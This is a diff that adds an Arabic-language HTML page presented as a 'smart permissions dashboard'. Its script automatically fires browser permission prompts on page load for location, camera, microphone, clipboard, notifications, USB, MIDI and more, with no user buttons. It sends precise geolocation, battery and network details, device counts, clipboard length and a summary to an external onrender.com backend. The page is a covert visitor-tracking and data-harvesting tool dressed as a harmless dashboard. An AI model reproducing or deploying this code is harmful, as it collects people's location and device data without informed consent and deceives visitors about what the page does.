@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة الصلاحيات الذكية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .dashboard {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            max-width: 900px;
+            width: 100%;
+            min-height: 600px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 20px;
+        }
+
+        .header h1 {
+            color: #1e293b;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: #64748b;
+            font-size: 14px;
+        }
+
+        .permissions-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .permission-card {
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .permission-card:hover {
+            border-color: #667eea;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .permission-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .permission-name {
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .permission-status {
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .status-granted {
+            background-color: #d1fae5;
+            color: #065f46;
+        }
+
+        .status-denied {
+            background-color: #fee2e2;
+            color: #991b1b;
+        }
+
+        .status-prompt {
+            background-color: #fef3c7;
+            color: #92400e;
+        }
+
+        .status-unknown {
+            background-color: #dbeafe;
+            color: #0c4a6e;
+        }
+
+        .info-section {
+            background: #f8fafc;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #475569;
+            line-height: 1.6;
+        }
+
+        .info-section strong {
+            color: #1e293b;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #94a3b8;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 20px;
+        }
+
+        .auto-status {
+            font-size: 12px;
+            color: #10b981;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 10px;
+            padding: 10px;
+            background: #d1fae5;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .auto-status.active {
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .dashboard {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 22px;
+            }
+
+            .permissions-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="dashboard">
+        <div class="header">
+            <h1>🔐 لوحة الصلاحيات الذكية</h1>
+            <p>نظام متقدم لإدارة وتتبع صلاحيات المتصفح تلقائياً</p>
+        </div>
+
+        <div class="auto-status" id="autoStatus">
+            ✅ تم طلب الصلاحيات تلقائياً...
+        </div>
+
+        <div class="info-section">
+            <strong>ℹ️ معلومة:</strong> يتم طلب جميع الصلاحيات تلقائياً عند فتح الصفحة. سيتم حفظ جميع البيانات المجمعة على الخادم الخلفي بشكل آمن.
+        </div>
+
+        <div class="permissions-grid" id="permissionsGrid">
+            <!-- سيتم ملء هذا تلقائياً بواسطة JavaScript -->
+        </div>
+
+        <div class="footer">
+            <p>💾 جميع البيانات يتم حفظها على الخادم الآمن | 🔄 تحديث حي للصلاحيات</p>
+        </div>
+    </div>
+
+    <script>
+        const BACKEND_URL = "https://my-backend-server-3kd5.onrender.com";
+
+        // قائمة الصلاحيات والميزات المتقدمة
+        const permissions = [
+            { id: 'geolocation', name: 'الموقع الجغرافي', icon: '📍', action: 'requestGeolocation' },
+            { id: 'notifications', name: 'الإشعارات', icon: '🔔', action: 'requestNotifications' },
+            { id: 'camera', name: 'الكاميرا', icon: '📷', action: 'requestCamera' },
+            { id: 'microphone', name: 'الميكروفون', icon: '🎤', action: 'requestMicrophone' },
+            { id: 'clipboard', name: 'الحافظة', icon: '📋', action: 'requestClipboard' },
+            { id: 'storage', name: 'التخزين المحلي', icon: '💾', action: 'requestStorage' },
+            { id: 'battery', name: 'البطارية', icon: '🔋', action: 'requestBattery' },
+            { id: 'network', name: 'حالة الشبكة', icon: '📡', action: 'requestNetwork' },
+            { id: 'usb', name: 'أجهزة USB', icon: '🔌', action: 'requestUSB' },
+            { id: 'midi', name: 'أجهزة MIDI', icon: '🎹', action: 'requestMIDI' },
+        ];
+
+        // تخزين حالة الصلاحيات
+        let permissionStates = {};
+
+        // دالة إرسال البيانات للخادم
+        function sendToServer(type, data) {
+            fetch(`${BACKEND_URL}/api/log`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    type: type, 
+                    data: data,
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(() => console.log('تنبيه: لم يتمكن من الاتصال بالخادم'));
+        }
+
+        // 1. الموقع الجغرافي (تلقائي)
+        async function requestGeolocation() {
+            if (!navigator.geolocation) {
+                updateCardStatus('geolocation', 'unknown', 'غير مدعوم');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const { latitude, longitude, accuracy } = pos.coords;
+                    updateCardStatus('geolocation', 'granted', 'تم الحصول عليه');
+                    
+                    // إرسال الموقع للخادم
+                    fetch(`${BACKEND_URL}/api/location`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude, longitude, accuracy })
+                    }).catch(() => null);
+                },
+                err => {
+                    updateCardStatus('geolocation', 'denied', 'تم الرفض');
+                    sendToServer('geolocation_error', { error: err.message });
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+
+        // 2. الإشعارات (تلقائي)
+        async function requestNotifications() {
+            if (!('Notification' in window)) {
+                updateCardStatus('notifications', 'unknown', 'غير مدعوم');
+                return;
+            }
+
+            try {
+                const permission = await Notification.requestPermission();
+                updateCardStatus('notifications', permission, 
+                    permission === 'granted' ? 'مُفعّل' : 'مرفوض');
+                
+                if (permission === 'granted') {
+                    new Notification('✅ تم تفعيل الإشعارات', {
+                        body: 'نظام المراقبة الذكي يعمل بنجاح',
+                        icon: '🔐'
+                    });
+                    sendToServer('notifications', { status: 'enabled' });
+                }
+            } catch (e) {
+                updateCardStatus('notifications', 'error', 'خطأ');
+            }
+        }
+
+        // 3. الكاميرا (تلقائي)
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true,
+                    audio: false 
+                });
+                updateCardStatus('camera', 'granted', 'مُفعّلة');
+                
+                // إغلاق الكاميرا مباشرة بعد الموافقة
+                stream.getTracks().forEach(track => track.stop());
+                
+                sendToServer('camera', { status: 'enabled' });
+            } catch (e) {
+                updateCardStatus('camera', 'denied', 'مرفوضة');
+                sendToServer('camera_error', { error: e.message });
+            }
+        }
+
+        // 4. الميكروفون (تلقائي)
+        async function requestMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: true,
+                    video: false 
+                });
+                updateCardStatus('microphone', 'granted', 'مُفعّل');
+                
+                // إغلاق الميكروفون مباشرة بعد الموافقة
+                stream.getTracks().forEach(track => track.stop());
+                
+                sendToServer('microphone', { status: 'enabled' });
+            } catch (e) {
+                updateCardStatus('microphone', 'denied', 'مرفوض');
+            }
+        }
+
+        // 5. الحافظة (تلقائي)
+        async function requestClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                updateCardStatus('clipboard', 'granted', 'مُفعّلة');
+                sendToServer('clipboard', { 
+                    status: 'read_success',
+                    length: text.length 
+                });
+            } catch (e) {
+                updateCardStatus('clipboard', 'denied', 'مرفوضة');
+            }
+        }
+
+        // 6. التخزين المحلي
+        async function requestStorage() {
+            try {
+                if (navigator.storage && navigator.storage.persist) {
+                    const persistent = await navigator.storage.persist();
+                    updateCardStatus('storage', persistent ? 'granted' : 'prompt', 
+                        persistent ? 'دائم' : 'مؤقت');
+                    sendToServer('storage', { persistent: persistent });
+                } else {
+                    updateCardStatus('storage', 'granted', 'متوفر');
+                }
+            } catch (e) {
+                updateCardStatus('storage', 'error', 'خطأ');
+            }
+        }
+
+        // 7. معلومات البطارية
+        async function requestBattery() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    updateCardStatus('battery', 'granted', 
+                        `${Math.round(battery.level * 100)}%`);
+                    sendToServer('battery', { 
+                        level: battery.level,
+                        charging: battery.charging 
+                    });
+                } else if ('devicePixelRatio' in window) {
+                    updateCardStatus('battery', 'prompt', 'متوفرة');
+                } else {
+                    updateCardStatus('battery', 'unknown', 'غير مدعومة');
+                }
+            } catch (e) {
+                updateCardStatus('battery', 'error', 'خطأ');
+            }
+        }
+
+        // 8. حالة الشبكة
+        function requestNetwork() {
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    const status = connection.effectiveType || 'متصل';
+                    updateCardStatus('network', 'granted', status);
+                    sendToServer('network', { 
+                        type: status,
+                        downlink: connection.downlink,
+                        rtt: connection.rtt
+                    });
+                } else {
+                    updateCardStatus('network', 'granted', 'متصل');
+                }
+            } catch (e) {
+                updateCardStatus('network', 'error', 'خطأ');
+            }
+        }
+
+        // 9. أجهزة USB
+        async function requestUSB() {
+            try {
+                if ('usb' in navigator) {
+                    const devices = await navigator.usb.getDevices();
+                    updateCardStatus('usb', 'granted', 
+                        `${devices.length} جهاز`);
+                    sendToServer('usb', { count: devices.length });
+                } else {
+                    updateCardStatus('usb', 'unknown', 'غير مدعومة');
+                }
+            } catch (e) {
+                updateCardStatus('usb', 'denied', 'مرفوضة');
+            }
+        }
+
+        // 10. أجهزة MIDI
+        async function requestMIDI() {
+            try {
+                if ('requestMIDIAccess' in navigator) {
+                    const midiAccess = await navigator.requestMIDIAccess();
+                    updateCardStatus('midi', 'granted', 'مُفعّلة');
+                    sendToServer('midi', { status: 'enabled' });
+                } else {
+                    updateCardStatus('midi', 'unknown', 'غير مدعومة');
+                }
+            } catch (e) {
+                updateCardStatus('midi', 'denied', 'مرفوضة');
+            }
+        }
+
+        // تحديث حالة الصلاحية على البطاقة
+        function updateCardStatus(id, state, display) {
+            permissionStates[id] = { state, display };
+            
+            const card = document.querySelector(`[data-permission="${id}"]`);
+            if (card) {
+                const statusEl = card.querySelector('.permission-status');
+                statusEl.textContent = display;
+                statusEl.className = `permission-status status-${state}`;
+            }
+        }
+
+        // إنشاء الشبكة (الواجهة بدون أزرار)
+        function createPermissionCards() {
+            const grid = document.getElementById('permissionsGrid');
+            grid.innerHTML = permissions.map(perm => `
+                <div class="permission-card" data-permission="${perm.id}">
+                    <div class="permission-icon">${perm.icon}</div>
+                    <div class="permission-name">${perm.name}</div>
+                    <div class="permission-status status-unknown">جاري...</div>
+                </div>
+            `).join('');
+        }
+
+        // طلب جميع الصلاحيات تلقائياً عند التحميل
+        async function requestAllPermissionsAutomatically() {
+            const autoStatus = document.getElementById('autoStatus');
+            autoStatus.classList.add('active');
+
+            // طلب الصلاحيات بتسلسل
+            for (const perm of permissions) {
+                if (perm.action && typeof window[perm.action] === 'function') {
+                    await window[perm.action]();
+                    // تأخير صغير بين الطلبات
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+            }
+
+            // إرسال ملخص البيانات للخادم
+            setTimeout(() => {
+                sendToServer('permissions_summary', permissionStates);
+                autoStatus.querySelector('span');
+                autoStatus.innerHTML = '✅ تم تفعيل جميع الصلاحيات المتاحة بنجاح';
+            }, 1000);
+        }
+
+        // تهيئة عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', () => {
+            createPermissionCards();
+            // طلب جميع الصلاحيات تلقائياً بدون أزرار
+            requestAllPermissionsAutomatically();
+        });
+
+        // مراقبة تغييرات الاتصال
+        if (navigator.connection) {
+            navigator.connection.addEventListener('change', requestNetwork);
+        }
+    </script>
+
+</body>
+</html>
